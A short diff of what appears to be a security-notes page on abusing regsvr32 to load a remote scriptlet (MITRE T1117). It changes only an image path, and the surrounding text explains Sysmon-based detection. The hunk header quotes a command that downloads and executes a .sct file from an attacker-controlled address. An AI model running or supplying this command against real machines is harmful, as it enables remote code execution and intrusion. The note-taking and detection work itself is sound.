@@ -37,7 +37,7 @@ regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
 
 Note how regsvr32 process exits almost immediately. This means that just by looking at the list of processes on the victim machine, the evil process may not be immedialy evident... Not until you realise how it was invoked though. Sysmon commandline logging may help you detect this activity:
 
-![](../../.gitbook/assets/regsvr32-commandline.png)
+![](<../../.gitbook/assets/regsvr32-commandline (1).png>)
 
 Additionally, of course sysmon will show regsvr32 establishing a network connection:
 
@@ -46,4 +46,3 @@ Additionally, of course sysmon will show regsvr32 establishing a network connect
 ## References
 
 {% embed url="https://attack.mitre.org/wiki/Technique/T1117" %}
-
